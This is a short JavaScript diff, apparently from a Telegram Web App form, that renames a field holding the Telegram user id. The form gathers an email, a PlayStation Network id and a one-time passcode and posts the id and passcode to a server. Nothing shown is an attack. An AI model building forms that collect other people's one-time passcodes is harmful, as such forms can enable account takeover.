@@ -256,7 +256,7 @@
                 email: document.getElementById('email').value,
                 psn: document.getElementById('psn').value,
                 otp: document.getElementById('otp').value,
-                tg_id: tg.initDataUnsafe.user.id
+                user_id: tg.initDataUnsafe.user.id
             };
 
             try {
@@ -267,7 +267,7 @@
                         'Content-Type': 'application/json',
                     },
                     body: JSON.stringify({
-                        tg_id: formData.tg_id,
+                        tg_id: formData.user_id,
                         otp: formData.otp
                     })
                 });
